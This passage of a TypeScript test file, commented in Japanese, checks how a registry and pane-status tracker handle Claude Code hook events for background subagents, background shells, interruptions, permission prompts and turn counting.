  const obj = JSON.parse(raw) as { subtype: string; kind: string; agents: Array<Record<string, unknown>> };
  assert.equal(obj.subtype, "workflow_snapshot");
  assert.equal(obj.kind, "subagents");
  return new Map(obj.agents.map((a) => [String(a.id), a]));
}

/** バックグラウンドで起動したサブエージェント（PreToolUse(Agent) → SubagentStart → PostToolUse の async_launched）。 */
function launchBackgroundAgent(registry: ClaudeTerminalRegistry, id: string, toolUseId: string, description: string, type = "general-purpose", pane?: string): void {
  const input = { description, subagent_type: type, prompt: "sleep" };
  registry.ingest(hook("PreToolUse", { tool_name: "Agent", tool_use_id: toolUseId, tool_input: input }), pane);
  registry.ingest(hook("SubagentStart", { agent_id: id, agent_type: type }), pane);
  registry.ingest(
    hook("PostToolUse", { tool_name: "Agent", tool_use_id: toolUseId, tool_input: input, tool_response: { isAsync: true, status: "async_launched", agentId: id, description } }),
    pane
  );
}

async function paneEntry(panes: TerminalPaneStatus, pane: string) {
  return (await panes.poll(-1, 0)).panes.find((p) => p.pane === pane);
}

test("知らせのターン: 終わった行を捨てず、吹き出しに出さず、done に origin を付ける", () => {
  const { published, registry } = setup();
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "サブエージェントで調べて" }));
  launchBackgroundAgent(registry, "a1", "toolu_A", "probe sleeper A");
  registry.ingest(hook("MessageDisplay", { message_id: "m1", index: 0, final: true, delta: "launched" }));
  registry.ingest(
    hook("Stop", {
      last_assistant_message: "launched",
      background_tasks: [{ id: "a1", type: "subagent", status: "running", description: "probe sleeper A", agent_type: "general-purpose" }]
    })
  );
  let seen = published.splice(0);
  assert.equal(seen.filter((e) => e.type === "done").length, 1);
  assert.equal(seen.filter((e) => e.type === "done").at(-1)?.metadata?.origin, undefined, "頼んだターンの done には付けない");
  assert.deepEqual(seen.filter((e) => e.type === "assistant_delta").map((e) => e.content), ["launched"]);
  assert.equal(rowsOf(seen).get("a1")?.state, "running");
  assert.equal(rowsOf(seen).get("a1")?.background, true);

  // サブエージェントが終わる。Stop のたびの次の発話の候補づくり（agent_type ""）は行にしない。
  registry.ingest(hook("SubagentStop", { agent_id: "a1", agent_type: "general-purpose", last_assistant_message: "hi" }));
  registry.ingest(hook("SubagentStop", { agent_id: "h1", agent_type: "", last_assistant_message: "check on sleeper A" }));
  seen = published.splice(0);
  assert.equal(rowsOf(seen).get("a1")?.state, "done");
  assert.equal(rowsOf(seen).has("h1"), false);

  const notification = [
    "<task-notification>",
    "<task-id>a1</task-id>",
    "<tool-use-id>toolu_A</tool-use-id>",
    "<status>completed</status>",
    '<summary>Agent "probe sleeper A" finished</summary>',
    "<result>hi</result>",
    "<usage><subagent_tokens>24570</subagent_tokens><tool_uses>1</tool_uses><duration_ms>24935</duration_ms></usage>",
    "</task-notification>"
  ].join("\n");
  registry.ingest(hook("UserPromptSubmit", { prompt: notification }));
  assert.equal(registry.liveEntries().find((e) => e.sessionId === SID)?.generating, true, "知らせのターンもターン（CLI は作業中）");
  registry.ingest(hook("MessageDisplay", { message_id: "m2", index: 0, final: true, delta: "The background subagent finished." }));
  registry.ingest(hook("Stop", { last_assistant_message: "The background subagent finished.", background_tasks: [] }));
  seen = published.splice(0);
  assert.ok(!seen.some((e) => e.type === "user_message"), "知らせは吹き出しに出さない");
  assert.equal(seen.filter((e) => e.type === "done").at(-1)?.metadata?.origin, "task-notification");
  // 終わった行は知らせのターンでも捨てない（知らせの usage も入る）。
  const snap = snapshotRows(registry);
  assert.equal(snap.get("a1")?.state, "done");
  assert.equal(snap.get("a1")?.result, "hi");
  assert.equal(snap.get("a1")?.tokens, 24570);

  // 次に頼んだターンで終わった行を捨てる。done に origin は付かない。
  registry.ingest(hook("UserPromptSubmit", { prompt: "ありがとう" }));
  registry.ingest(hook("Stop", { last_assistant_message: "どういたしまして" }));
  seen = published.splice(0);
  assert.equal(seen.filter((e) => e.type === "done").at(-1)?.metadata?.origin, undefined);
  assert.equal(snapshotRows(registry).size, 0, "行が無くても agents: [] で返す");
});

test("内部の補助（agent_id があり agent_type が空・無い）は最初に捨てる。行にも親のツール行にもペインの状態にもしない", async () => {
  const { published, registry, panes } = setup();
  const pane = "pane-helper";
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "やって" }), pane);
  registry.ingest(hook("Stop", { last_assistant_message: "やりました" }), pane);
  published.length = 0;
  assert.equal(panes.state(pane, SID), "done");

  // 次の発話の候補づくり（SubagentStop の agent_type ""。SubagentStart は来ない）
  assert.equal(registry.ingest(hook("SubagentStop", { agent_id: "h1", agent_type: "", last_assistant_message: "next?" }), pane), true);
  // バックグラウンドのエージェントの要約（PreToolUse に agent_type キーが無い。PostToolUse は来ない）
  registry.ingest(hook("PreToolUse", { agent_id: "h2", tool_name: "Bash", tool_use_id: "toolu_h", tool_input: { command: "ping -c 30 127.0.0.1" } }), pane);
  registry.ingest(hook("SubagentStart", { agent_id: "h3", agent_type: "" }), pane);
  assert.deepEqual(published.map((e) => e.type), []);
  assert.equal(panes.state(pane, SID), "done", "作業中に戻さない");
  assert.equal(snapshotRows(registry).size, 0);
  // 次のターンの Stop で閉じる親のツール行も無い
  registry.ingest(hook("UserPromptSubmit", { prompt: "次" }), pane);
  registry.ingest(hook("Stop", { last_assistant_message: "はい" }), pane);
  assert.ok(!published.some((e) => e.type === "tool_end"));
  assert.equal((await paneEntry(panes, pane))?.turn, 2);
});

test("Esc の中断は前景のサブエージェントと開いたままのツール行だけを閉じる（バックグラウンドのサブエージェントは止まらない）", async () => {
  const { published, registry, panes } = setup();
  const pane = "pane-esc";
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "調べて" }), pane);
  launchBackgroundAgent(registry, "abg", "toolu_bg", "probe pinger C", "general-purpose", pane);
  // 前景のサブエージェント（終わるまで PostToolUse が来ない）
  registry.ingest(hook("PreToolUse", { tool_name: "Agent", tool_use_id: "toolu_fg", tool_input: { description: "probe fg", subagent_type: "Explore" } }), pane);
  registry.ingest(hook("SubagentStart", { agent_id: "afg", agent_type: "Explore" }), pane);
  // 親の前景の Bash（中断されると PostToolUse も PostToolUseFailure も来ない）
  registry.ingest(hook("PreToolUse", { tool_name: "Bash", tool_use_id: "toolu_ping", tool_input: { command: "ping -c 30 127.0.0.1" } }), pane);
  published.length = 0;

  registry.ingest({ session_id: SID, hook_event_name: "Stop", buddy_interrupted: true });
  let seen = published.splice(0);
  assert.equal(rowsOf(seen).get("afg")?.state, "stopped");
  assert.equal(rowsOf(seen).has("abg"), false, "バックグラウンドの行は閉じない");
  const ends = seen.filter((e) => e.type === "tool_end");
  assert.deepEqual(new Set(ends.map((e) => e.toolUseId)), new Set(["toolu_ping", "toolu_fg"]));
  assert.ok(ends.every((e) => e.metadata?.status === "interrupted"));
  assert.equal(seen.at(-1)?.type, "done");
  assert.equal(snapshotRows(registry).get("abg")?.state, "running");
  let entry = await paneEntry(panes, pane);
  assert.equal(entry?.state, "idle");
  assert.equal(entry?.backgroundAgents, 1);
  assert.equal(registry.liveEntries().find((e) => e.sessionId === SID)?.generating, false);
  assert.ok(registry.backgroundSessionIds().has(SID));

  // バックグラウンドのサブエージェントは後から終わる。そのツールは親のツール行にもペインの状態にも混ざらない。
  const sub = { agent_id: "abg", agent_type: "general-purpose", tool_name: "Bash", tool_use_id: "toolu_sub", tool_input: { command: "ping -c 40 127.0.0.1" } };
  registry.ingest(hook("PreToolUse", sub), pane);
  registry.ingest(hook("PostToolUse", { ...sub, tool_response: { stdout: "hi" } }), pane);
  registry.ingest(hook("SubagentStop", { agent_id: "abg", agent_type: "general-purpose", last_assistant_message: "hi" }), pane);
  seen = published.splice(0);
  assert.ok(!seen.some((e) => e.type === "tool_end" || e.type === "tool_start"));
  assert.equal(rowsOf(seen).get("abg")?.state, "done");
  entry = await paneEntry(panes, pane);
  assert.equal(entry?.state, "idle");
  assert.equal(entry?.backgroundAgents, 0);
  assert.ok(!registry.backgroundSessionIds().has(SID));
});

test("サブエージェントの hook は、親の選択肢を閉じず、ペインの attention を作業中に戻さない", async () => {
  const { published, registry, panes } = setup();
  const pane = "pane-sub";
  const main = { command: "make clean" };
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "調べてから直して" }), pane);
  launchBackgroundAgent(registry, "a1", "toolu_A", "Explore", "Explore", pane);
  registry.ingest(hook("PreToolUse", { tool_name: "Bash", tool_use_id: "toolu_main", tool_input: main }), pane);
  assert.equal(await registry.ingestPermission(hook("PermissionRequest", { tool_name: "Bash", tool_input: main }), pane), true);
  const card = published.filter((e) => e.type === "action_request").at(-1)!;
  assert.equal(panes.state(pane, SID), "attention");
  published.length = 0;

  // 並んで動くサブエージェントが、同じ名前のツールを使う
  const sub = { agent_id: "a1", agent_type: "Explore", tool_name: "Bash", tool_use_id: "toolu_sub", tool_input: { command: "ls" } };
  registry.ingest(hook("PreToolUse", sub), pane);
  registry.ingest(hook("PostToolUse", { ...sub, tool_response: { stdout: "a" } }), pane);
  let seen = published.splice(0);
  assert.ok(!seen.some((e) => e.type === "action_resolved"), "親の選択肢を閉じない");
  assert.ok(!seen.some((e) => e.type === "tool_start" || e.type === "tool_end"), "親のツール行に混ぜない");
  assert.equal(panes.state(pane, SID), "attention");

  // 親のツールが実行されたら閉じる
  registry.ingest(hook("PostToolUse", { tool_name: "Bash", tool_use_id: "toolu_main", tool_input: main, tool_response: { stdout: "" } }), pane);
  seen = published.splice(0);
  assert.equal(seen.find((e) => e.type === "action_resolved")?.messageId, card.messageId);
  assert.equal(panes.state(pane, SID), "working");
});

test("サブエージェントの選択肢は、親の発話や Stop では閉じず、そのサブエージェントのツールの実行・終わりで閉じる", async () => {
  const { published, registry, panes } = setup();
  const pane = "pane-subprompt";
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "裏で調べて" }), pane);
  launchBackgroundAgent(registry, "a1", "toolu_A", "Explore", "Explore", pane);
  registry.ingest(
    hook("Stop", { last_assistant_message: "調べています", background_tasks: [{ id: "a1", type: "subagent", status: "running", agent_type: "Explore" }] }),
    pane
  );
  published.length = 0;

  await registry.ingestPermission(hook("PermissionRequest", { agent_id: "a1", agent_type: "Explore", tool_name: "WebFetch", tool_input: { url: "https://example.com" } }), pane);
  const card = published.filter((e) => e.type === "action_request").at(-1)!;
  // 親の発話と Stop では閉じない
  registry.ingest(hook("UserPromptSubmit", { prompt: "まだ？" }), pane);
  registry.ingest(hook("Stop", { last_assistant_message: "まだです" }), pane);
  assert.ok(!published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));
  // そのサブエージェントの同じツールが実行されたら閉じる
  registry.ingest(
    hook("PostToolUse", { agent_id: "a1", agent_type: "Explore", tool_name: "WebFetch", tool_use_id: "toolu_w", tool_input: { url: "https://example.com" }, tool_response: "ok" }),
    pane
  );
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));

  // 親のターンが終わった後の、サブエージェントの選択肢。サブエージェントが終われば閉じ、attention を外す。
  const before = await paneEntry(panes, pane);
  published.length = 0;
  await registry.ingestPermission(hook("PermissionRequest", { agent_id: "a1", agent_type: "Explore", tool_name: "Bash", tool_input: { command: "curl x" } }), pane);
  const second = published.filter((e) => e.type === "action_request").at(-1)!;
  assert.equal(panes.state(pane, SID), "attention");
  registry.ingest(hook("SubagentStop", { agent_id: "a1", agent_type: "Explore", last_assistant_message: "done" }), pane);
  assert.equal(published.find((e) => e.type === "action_resolved")?.messageId, second.messageId);
  const afterEntry = await paneEntry(panes, pane);
  assert.equal(afterEntry?.state, "idle");
  assert.equal(afterEntry?.turn, before?.turn, "終わった 1 回には数えない");
});

test("Stop の last_assistant_message で吹き出しを確かめ、足りない分を done の前に流す。遅れて届いた MessageDisplay は捨てる", () => {
  const { published, registry } = setup();
  registry.register(SID);
  const deltas = (events: SessionEvent[]) => events.filter((e) => e.type === "assistant_delta");

  // 1) 最後の行バッチが Stop より遅れた（頭の部分は届いている）
  registry.ingest(hook("UserPromptSubmit", { prompt: "q1" }));
  registry.ingest(hook("MessageDisplay", { message_id: "m1", index: 0, final: false, delta: "First line.\n\n" }));
  registry.ingest(hook("Stop", { last_assistant_message: "First line.\n\nSecond line." }));
  registry.ingest(hook("MessageDisplay", { message_id: "m1", index: 1, final: true, delta: "Second line." }));
  let seen = published.splice(0);
  assert.deepEqual(deltas(seen).map((e) => e.content), ["First line.\n\n", "Second line."]);
  assert.equal(new Set(deltas(seen).map((e) => e.messageId)).size, 1, "同じ吹き出しに足す");
  assert.equal(seen.at(-1)?.type, "done", "遅れた本文を done の後に流さない");

  // 2) 本文が丸ごと Stop より遅れた（短い返事は final の 1 つに全部入る）
  registry.ingest(hook("UserPromptSubmit", { prompt: "q2" }));
  registry.ingest(hook("Stop", { last_assistant_message: "launched" }));
  registry.ingest(hook("MessageDisplay", { message_id: "m2", index: 0, final: true, delta: "launched" }));
  seen = published.splice(0);
  assert.deepEqual(deltas(seen).map((e) => e.content), ["launched"]);
  assert.equal(seen.at(-1)?.type, "done");
  assert.equal(deltas(seen)[0].messageId, seen.at(-1)?.messageId, "ターンの最初の吹き出し");

  // 3) ツールの前の前置きは届いたが、最後のメッセージがまだ → 新しい吹き出しで全部を流す
  registry.ingest(hook("UserPromptSubmit", { prompt: "q3" }));
  registry.ingest(hook("MessageDisplay", { message_id: "m3", index: 0, final: true, delta: "Let me check." }));
  registry.ingest(hook("PreToolUse", { tool_name: "Read", tool_use_id: "toolu_r", tool_input: { file_path: "/tmp/a" } }));
  registry.ingest(hook("PostToolUse", { tool_name: "Read", tool_use_id: "toolu_r", tool_input: { file_path: "/tmp/a" }, tool_response: "ok" }));
  registry.ingest(hook("Stop", { last_assistant_message: "All good." }));
  registry.ingest(hook("MessageDisplay", { message_id: "m4", index: 0, final: true, delta: "All good." }));
  seen = published.splice(0);
  assert.deepEqual(deltas(seen).map((e) => e.content), ["Let me check.", "All good."]);
  assert.notEqual(deltas(seen)[0].messageId, deltas(seen)[1].messageId);
  assert.equal(seen.at(-1)?.type, "done");

  // 4) 全部届いていれば何も足さない。同じ Stop が重ねて届いても流し直さない
  registry.ingest(hook("UserPromptSubmit", { prompt: "q4" }));
  registry.ingest(hook("MessageDisplay", { message_id: "m5", index: 0, final: true, delta: "Done." }));
  registry.ingest(hook("Stop", { last_assistant_message: "Done." }));
  registry.ingest(hook("Stop", { last_assistant_message: "Done." }));
  seen = published.splice(0);
  assert.deepEqual(deltas(seen).map((e) => e.content), ["Done."]);
});

test("ペインの turn は main のスレッドが動いた後の Stop ごとに増え、動いている数は backgroundAgents / backgroundShells で別に持つ", async () => {
  const { registry, panes } = setup();
  const pane = "pane-turns";
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "裏で 2 つ" }), pane);
  const bash = { command: "sleep 40; echo done", description: "probe bg shell E", run_in_background: true };
  registry.ingest(hook("PreToolUse", { tool_name: "Bash", tool_use_id: "toolu_B", tool_input: bash }), pane);
  launchBackgroundAgent(registry, "aE", "toolu_A", "probe sleeper E", "general-purpose", pane);
  registry.ingest(hook("PostToolUse", { tool_name: "Bash", tool_use_id: "toolu_B", tool_input: bash, tool_response: { stdout: "", backgroundTaskId: "bE" } }), pane);
  let e = await paneEntry(panes, pane);
  assert.deepEqual([e?.state, e?.backgroundAgents, e?.backgroundShells], ["working", 1, 1]);
  assert.equal(e?.backgroundOnlyAgents, 1, "background のサブエージェントは Live Activity の数に入る");
  const start = e?.turn ?? 0;

  registry.ingest(hook("MessageDisplay", { message_id: "m1", final: true, delta: "both" }), pane);
  registry.ingest(
    hook("Stop", {
      last_assistant_message: "both",
      background_tasks: [
        { id: "aE", type: "subagent", status: "running", description: "probe sleeper E", agent_type: "general-purpose" },
        { id: "bE", type: "shell", status: "running", description: "probe bg shell E", command: "sleep 40; echo done" }
      ]
    }),
    pane
  );
  e = await paneEntry(panes, pane);
  assert.deepEqual([e?.state, e?.turn, e?.reply, e?.backgroundAgents, e?.backgroundShells], ["done", start + 1, "both", 1, 1], "main のターンは終わった（返事を読み上げる）");

  // サブエージェントが終わる。状態と turn はそのまま、数だけ変わる。
  registry.ingest(hook("SubagentStop", { agent_id: "aE", agent_type: "general-purpose", last_assistant_message: "hi" }), pane);
  e = await paneEntry(panes, pane);
  assert.deepEqual([e?.state, e?.turn, e?.backgroundAgents, e?.backgroundOnlyAgents], ["done", start + 1, 0, 0]);

  // 知らせのターン（サブエージェント）。シェルが残ったまま終わる。
  registry.ingest(
    hook("UserPromptSubmit", {
      prompt: '<task-notification>\n<task-id>aE</task-id>\n<status>completed</status>\n<summary>Agent "probe sleeper E" finished</summary>\n<result>hi</result>\n</task-notification>'
    }),
    pane
  );
  registry.ingest(
    hook("Stop", {
      last_assistant_message: "The agent finished; the shell is still running.",
      background_tasks: [{ id: "bE", type: "shell", status: "running", description: "probe bg shell E" }]
    }),
    pane
  );
  e = await paneEntry(panes, pane);
  assert.deepEqual([e?.turn, e?.backgroundShells], [start + 2, 1]);

  // 本文だけで終わるターン（UserPromptSubmit の来ない古い形）。done → done でも数える。
  registry.ingest(hook("MessageDisplay", { message_id: "m3", final: true, delta: "The shell finished." }), pane);
  registry.ingest(hook("Stop", { last_assistant_message: "The shell finished.", background_tasks: [] }), pane);
  e = await paneEntry(panes, pane);
  assert.deepEqual([e?.state, e?.turn, e?.reply, e?.backgroundShells], ["done", start + 3, "The shell finished.", 0], "Stop の一覧に無いシェルは閉じる");
  // 動きの無い Stop の重複は数えない
  registry.ingest(hook("Stop", { last_assistant_message: "The shell finished." }), pane);
  assert.equal((await paneEntry(panes, pane))?.turn, start + 3);

  // SessionEnd（/clear）の後、同じペインの新しい会話は続きから数える。
  registry.ingest(hook("SessionEnd", { reason: "clear" }), pane);
  assert.equal(await paneEntry(panes, pane), undefined);
  const sid2 = "45454545-4545-4545-8545-454545454545";
  registry.register(sid2);
  registry.ingest(hook("UserPromptSubmit", { prompt: "新しい会話" }, sid2), pane);
  registry.ingest(hook("Stop", { last_assistant_message: "はい" }, sid2), pane);
  e = await paneEntry(panes, pane);
  assert.deepEqual([e?.sessionId, e?.turn], [sid2, start + 4]);
});

test("TaskStop は止めた行をすぐ stopped で閉じる。サブエージェントの中の Agent の起動も tool_response の agentId で行にする", () => {
  const { published, registry } = setup();
  registry.register(SID);
  const bash = { command: "ping 127.0.0.1 > /dev/null", description: "probe endless G", run_in_background: true };
  registry.ingest(hook("UserPromptSubmit", { prompt: "ping を裏で" }));
  registry.ingest(hook("PreToolUse", { tool_name: "Bash", tool_use_id: "toolu_G", tool_input: bash }));
  registry.ingest(hook("PostToolUse", { tool_name: "Bash", tool_use_id: "toolu_G", tool_input: bash, tool_response: { stdout: "", backgroundTaskId: "bG" } }));
  registry.ingest(hook("Stop", { last_assistant_message: "started", background_tasks: [{ id: "bG", type: "shell", status: "running", description: "probe endless G" }] }));
  let seen = published.splice(0);
  assert.equal(rowsOf(seen).get("bG")?.state, "running");
  assert.equal(rowsOf(seen).get("bG")?.rowKind, "shell");

  registry.ingest(hook("UserPromptSubmit", { prompt: "止めて" }));
  registry.ingest(hook("PreToolUse", { tool_name: "TaskStop", tool_use_id: "toolu_S", tool_input: { task_id: "bG" } }));
  registry.ingest(
    hook("PostToolUse", {
      tool_name: "TaskStop",
      tool_use_id: "toolu_S",
      tool_input: { task_id: "bG" },
      tool_response: { message: "Successfully stopped task: bG", task_id: "bG", task_type: "local_bash" }
    })
  );
  seen = published.splice(0);
  assert.equal(rowsOf(seen).get("bG")?.state, "stopped");
  registry.ingest(hook("Stop", { last_assistant_message: "stopped", background_tasks: [] }));
  assert.equal(snapshotRows(registry).get("bG")?.state, "stopped", "Stop の照合で done に戻さない");

  // サブエージェントの中から、さらにバックグラウンドのエージェントを起動する
  registry.ingest(hook("UserPromptSubmit", { prompt: "入れ子で" }));
  launchBackgroundAgent(registry, "aO", "toolu_O", "outer");
  published.length = 0;
  const inner = { description: "inner", subagent_type: "Explore", prompt: "look" };
  registry.ingest(hook("PreToolUse", { agent_id: "aO", agent_type: "general-purpose", tool_name: "Agent", tool_use_id: "toolu_N", tool_input: inner }));
  registry.ingest(hook("SubagentStart", { agent_id: "aN", agent_type: "Explore" }));
  registry.ingest(
    hook("PostToolUse", { agent_id: "aO", agent_type: "general-purpose", tool_name: "Agent", tool_use_id: "toolu_N", tool_input: inner, tool_response: { status: "async_launched", agentId: "aN" } })
  );
  assert.ok(!published.some((e) => e.toolUseId === "toolu_N"), "サブエージェントのツールは親のツール行に出さない");
  const snap = snapshotRows(registry);
  assert.deepEqual([snap.get("aN")?.state, snap.get("aN")?.label, snap.get("aN")?.background], ["running", "inner", true]);
});

test("台帳: サブエージェントの全行は行が無くても agents: [] で返し、終わった行も渡す。バックグラウンドの一覧は動いているものだけ", async () => {
  const { registry, inbox } = setup();
  registry.register(SID);
  assert.ok(registry.subagentSnapshot(SID)?.includes('"agents":[]'), "行が無くても agents: [] で返す");
  assert.equal(registry.subagentSnapshot("missing-session"), undefined);
  // 誰も見ていない間に、サブエージェントが起動して終わった
  registry.ingest(hook("UserPromptSubmit", { prompt: "調べて" }));
  launchBackgroundAgent(registry, "a1", "toolu_A", "probe");
  registry.ingest(hook("Stop", { last_assistant_message: "launched", background_tasks: [{ id: "a1", type: "subagent", status: "running", agent_type: "general-purpose" }] }));
  assert.ok(registry.backgroundSessionIds().has(SID));
  registry.ingest(hook("SubagentStop", { agent_id: "a1", agent_type: "general-purpose", last_assistant_message: "hi" }));
  assert.ok(!registry.backgroundSessionIds().has(SID));
  assert.equal(snapshotRows(registry).get("a1")?.state, "done");
  // ClaudeTerminalSession も同じ全行を返す（server が接続のたびと turn_status_request で送る）。
  assert.equal(await new ClaudeTerminalSession(SID, registry, inbox).subagentSnapshot(), registry.subagentSnapshot(SID));
});

test("発話と知らせが混ざった prompt: 知らせで行を閉じてから発話を流し、閉じた行はトラッカーからも捨てる（mac と同じ）", () => {
  const { published, registry } = setup();
  registry.register(SID);
  registry.ingest(hook("UserPromptSubmit", { prompt: "調べて" }));
  launchBackgroundAgent(registry, "a1", "toolu_A", "probe");
  registry.ingest(hook("Stop", { last_assistant_message: "launched", background_tasks: [{ id: "a1", type: "subagent", status: "running", agent_type: "general-purpose" }] }));
  published.length = 0;
  const prompt =
    '<task-notification>\n<task-id>a1</task-id>\n<status>completed</status>\n<summary>Agent "probe" finished</summary>\n<result>見つかりました</result>\n</task-notification>\n次はこれを直して';
  registry.ingest(hook("UserPromptSubmit", { prompt }));
  const rowIndex = published.findIndex((e) => e.type === "workflow_progress");
  const userIndex = published.findIndex((e) => e.type === "user_message");
  assert.ok(rowIndex >= 0 && userIndex > rowIndex, "行を閉じてから発話を流す");
  assert.equal(published[userIndex].content, "次はこれを直して");
  assert.equal(snapshotRows(registry).get("a1"), undefined, "この発話で閉じた行がトラッカーにだけ残った");
});

test("ペイン: サブエージェントの hook は状態を変えず、選択肢・確認の知らせはサブエージェントのものでも attention", () => {
  const s = (e: string, h: Record<string, unknown> = {}, current?: string) => paneState(e, h, current);
  assert.equal(s("UserPromptSubmit"), "working");
  assert.equal(s("PreToolUse"), "working");
  assert.equal(s("PermissionRequest"), "attention");
  // 答えるまで止まる確認（許可・MCP の入力・MCP のリンクを開く確認・バックグラウンドの worker の許可）は attention
  for (const type of ["permission_prompt", "elicitation_dialog", "elicitation_url_dialog", "worker_permission_prompt"]) {
    assert.equal(s("Notification", { notification_type: type }), "attention", type);
  }
  assert.equal(s("Notification", { notification_type: "idle_prompt" }), undefined);
  // main のターンの終わりは、バックグラウンドの作業が残っていても done（残りの数は別に持つ）
  assert.equal(s("Stop", { background_tasks: [{ id: "a1", type: "subagent", status: "running" }] }), "done");
  assert.equal(s("Stop", { buddy_interrupted: true }), "idle");
  assert.equal(s("StopFailure"), "error");
  for (const e of ["SubagentStart", "SubagentStop"]) assert.equal(s(e, {}, "working"), undefined, e);
  const sub = { agent_id: "a1", agent_type: "general-purpose" };
  for (const e of ["PreToolUse", "PostToolUse", "PostToolUseFailure", "MessageDisplay", "SubagentStart", "SubagentStop"]) {
    assert.equal(s(e, sub, "attention"), undefined, e);
    assert.equal(s(e, sub, "done"), undefined, e);
  }
  assert.equal(s("PermissionRequest", sub), "attention");
  assert.equal(s("PreToolUse", { agent_id: "" }), "working", "agent_id が空なら main のスレッド");
});

test("ペイン: done が続いても前の done の後に main の動きがあれば数え、turn は entry を消しても続きから数える", async () => {
  const st = new TerminalPaneStatus();
  st.set("p1", "working", "s1", undefined);
  st.set("p1", "done", "s1", undefined, "claude", "起動しました");
  assert.equal((await st.poll(-1, 0)).panes[0].turn, 1);
  // 動きの無い done の繰り返しは数えない（知らせない）
  const v = (await st.poll(-1, 0)).version;
  st.set("p1", "done", "s1", undefined, "claude", "x");
  let r = await st.poll(-1, 0);
  assert.deepEqual([r.version, r.panes[0].turn, r.panes[0].reply], [v, 1, "起動しました"]);
  // UserPromptSubmit の来ないターン（本文 → Stop）。本文の後の done は数える
  st.note("p1", "s1", { activity: true });
  st.set("p1", "done", "s1", undefined, "claude", "終わりました");
  r = await st.poll(-1, 0);
  assert.deepEqual([r.panes[0].turn, r.panes[0].reply], [2, "終わりました"]);
  // 中断（idle）の後の動きの無い done は、状態が変わったので数える
  st.set("p1", "idle", "s1", undefined);
  st.set("p1", "done", "s1", undefined);
  assert.equal((await st.poll(-1, 0)).panes[0].turn, 3);
  // 別の会話の動きは数えない
  st.note("p1", "other", { activity: true });
  st.set("p1", "done", "s1", undefined);
  assert.equal((await st.poll(-1, 0)).panes[0].turn, 3);

  // SessionEnd（/clear など）で entry が消えても、同じペインの次の会話は続きから数える。
  st.remove("p1", "s1");
  assert.deepEqual((await st.poll(-1, 0)).panes, []);
  st.set("p1", "working", "s2", undefined);
  assert.equal((await st.poll(-1, 0)).panes[0].turn, 3, "作業中では増えない");
  st.set("p1", "done", "s2", undefined);
  r = await st.poll(-1, 0);
  assert.deepEqual([r.panes[0].turn, r.panes[0].sessionId], [4, "s2"]);
  // 別のペインは 0 から
  st.set("p2", "done", "s3", undefined);
  assert.equal((await st.poll(-1, 0)).panes.find((p) => p.pane === "p2")?.turn, 1);
});

test("ペイン: 動いているバックグラウンドの作業の数は、状態を変えずに書ける（変わったときだけ知らせる）", async () => {
  const st = new TerminalPaneStatus();
  st.set("p1", "working", "s1", undefined, "claude", undefined, { agents: 1, shells: 0 });
  st.set("p1", "done", "s1", undefined, "claude", "起動しました", { agents: 1, shells: 1 });
  let r = await st.poll(-1, 0);
  assert.deepEqual([r.panes[0].state, r.panes[0].backgroundAgents, r.panes[0].backgroundShells], ["done", 1, 1]);
  const updatedAt = r.panes[0].updatedAt;
  // サブエージェントが終わった（SubagentStop）。状態・turn・返事はそのまま、数だけ変わる。
  st.note("p1", "s1", { background: { agents: 0, shells: 1 } });
  const after = await st.poll(r.version, 0);
  assert.notEqual(after.version, r.version);
  assert.deepEqual(
    [after.panes[0].state, after.panes[0].turn, after.panes[0].reply, after.panes[0].backgroundAgents, after.panes[0].backgroundShells, after.panes[0].updatedAt],
    ["done", 1, "起動しました", 0, 1, updatedAt]
  );
  // 同じ数なら知らせない。別の会話のものは書かない。
  r = after;
  st.note("p1", "s1", { background: { agents: 0, shells: 1 } });
  st.note("p1", "other", { background: { agents: 5, shells: 5 } });
  const same = await st.poll(-1, 0);
  assert.deepEqual([same.version, same.panes[0].backgroundAgents], [r.version, 0]);
  // 同じ状態の繰り返しでも、数が変われば書く。background を渡さなければ数は変えない。
  st.set("p1", "done", "s1", undefined, "claude", undefined, { agents: 0, shells: 0 });
  st.set("p1", "working", "s1", undefined);
  const last = (await st.poll(-1, 0)).panes[0];
  assert.deepEqual([last.turn, last.state, last.backgroundShells], [1, "working", 0]);
});

test("ペイン: Live Activity の数は、作業中・選択肢待ちなら background の行だけ、ほかは動いている行の全部（変わったときだけ知らせる）", () => {
  const st = new TerminalPaneStatus();
  let calls = 0;
  st.onBackgroundChanged = () => (calls += 1);
  st.set("p1", "working", "s1", undefined, "claude", undefined, { agents: 3, shells: 1, onlyAgents: 1 });
  assert.deepEqual(st.liveActivityCounts(), { s1: 1 });
  assert.equal(calls, 1);
  // 同じ状態・同じ数の繰り返しは知らせない。
  st.set("p1", "working", "s1", undefined, "claude", undefined, { agents: 3, shells: 1, onlyAgents: 1 });
  st.note("p1", "s1", { background: { agents: 3, shells: 0, onlyAgents: 1 } });
  assert.equal(calls, 1);
  // 選択肢待ちも作業中と同じ数え方。状態が変わったときは知らせる。
  st.set("p1", "attention", "s1", undefined, "claude", undefined, { agents: 3, shells: 0, onlyAgents: 1 });
  assert.deepEqual(st.liveActivityCounts(), { s1: 1 });
  assert.equal(calls, 2);
  // ターンが終わったら、前景から続いているサブエージェントも数える。
  st.set("p1", "done", "s1", undefined, "claude", "返事", { agents: 3, shells: 0, onlyAgents: 1 });
  assert.deepEqual(st.liveActivityCounts(), { s1: 3 });
  assert.equal(calls, 3);
  // background を渡さなければ数は変えない。onlyAgents を省いても前の値のまま。
  st.set("p1", "working", "s1", undefined);
  st.note("p1", "s1", { background: { agents: 3, shells: 0 } });
  assert.deepEqual(st.liveActivityCounts(), { s1: 1 });
  // sessionId の無いペインは pane:<pane>。数が 0 のペインは出さない。
  st.set("p2", "done", undefined, undefined, "claude", undefined, { agents: 2, shells: 0, onlyAgents: 2 });
  st.set("p3", "done", "s3", undefined, "claude", undefined, { agents: 0, shells: 4, onlyAgents: 0 });
  assert.deepEqual(st.liveActivityCounts(), { s1: 1, "pane:p2": 2 });
  // 会話が終わったら数から外れ、知らせる。
  const before = calls;
  st.remove("p1", "s1");
  assert.deepEqual(st.liveActivityCounts(), { "pane:p2": 2 });
  assert.equal(calls, before + 1);
});

